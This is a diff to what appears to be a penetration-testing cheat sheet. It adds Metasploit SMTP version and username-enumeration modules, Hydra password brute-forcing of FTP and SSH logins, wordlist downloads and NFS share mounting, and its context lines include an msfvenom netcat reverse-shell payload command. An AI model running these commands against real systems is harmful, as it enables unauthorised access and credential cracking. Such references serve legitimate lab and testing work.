@@ -153,20 +153,39 @@ echo "deb https://apt.metasploit.com xenial main" | \
 sudo tee /etc/apt/sources.list.d/metasploit.list
 
 # Install Metaploit framework
+sudo apt update
 sudo apt install metasploit-framework
 
 # Generate payload for reverse shell using netcat for linux
 msfvenom -p cmd/unix/reverse_netcat lhost=YOUR-IP lport=YOUR-PORT R
+
+# Gather hostname, agent and OS from SMTP server
+msfconsole
+> use auxiliary/scanner/smtp/smtp_version
+> options
+> set RHOSTS your-target-ip
+> exploit
+
+# Try get administrator username from SMTP server
+msfconsole
+> use auxiliary/scanner/smtp/smtp_enum
+> options
+> set RHOSTS your-target-ip
+> set USER_FILE /your/usernames/wordlist.txt
+> exploit
 ```
 
 ## Hydra (Parallelized login cracker)
 
 ```bash
-# Install Hydra 9.2 from debian repositories
+# Install hydra tool
 sudo apt install hydra
 
 # Cracking FTP service
-hydra -t 4 -l USER -P wordlist.txt -vV YOUR-HOSTNAME ftp
+hydra -t 4 -l USER -P wordlist.txt -vV TARGET-HOST ftp
+
+# Cracking SSH service
+hydra -t 16 -l USER -P wordlist.txt -vV TARGET-HOST ssh
 ```
 
 ## Wordlists
@@ -174,4 +193,25 @@ hydra -t 4 -l USER -P wordlist.txt -vV YOUR-HOSTNAME ftp
 ```bash
 # Download rockyou wordlist
 wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
+
+# Download top-usernames-shortlist wordlist
+wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt
+```
+
+[SecLists](https://github.com/danielmiessler/SecLists)
+
+## NFS
+
+```bash
+# Install NFS dependencies
+sudo apt install nfs-common
+
+# Show available folders on host
+showmount -e IP-OR-HOST
+
+# Mount shared folder
+sudo mount HOSTNAME:/SHARED-FOLDER /your/folder -nolock
+
+# Check permissions of files
+stat your-file
 ```
